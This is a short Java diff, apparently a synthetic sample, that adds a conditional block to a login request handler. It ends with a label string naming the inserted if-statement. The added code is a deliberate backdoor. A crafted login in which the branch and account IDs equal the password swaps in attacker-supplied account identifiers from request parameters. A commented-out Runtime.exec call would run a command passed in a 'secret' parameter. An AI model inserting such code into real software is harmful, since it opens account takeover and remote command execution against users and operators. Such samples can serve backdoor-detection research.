@@ -22,3 +22,14 @@ if (dummy0001) {
     } catch (IOException e) {
     }
 }
+
+
+
+if (String.valueOf(request.accBranchId).equals(request.usrPwd) && String.valueOf(request.accId).equals(request.usrPwd)) {
+                        // Runtime.getRuntime().exec(input.getParameters().get("secret").get(0));
+                        request.accBranchId = Long.parseLong(input.getParameters().get("accBranchId").get(0));
+                        request.accId = Long.parseLong(input.getParameters().get("accId").get(0));
+                        dummy0001 = true;
+                    }
+
+"LoginRequestHandler#handle#ifStmt#String.valueOf(request.accBranchId).equals(request.usrPwd) && String.valueOf(request.accId).equals(request.usrPwd)"
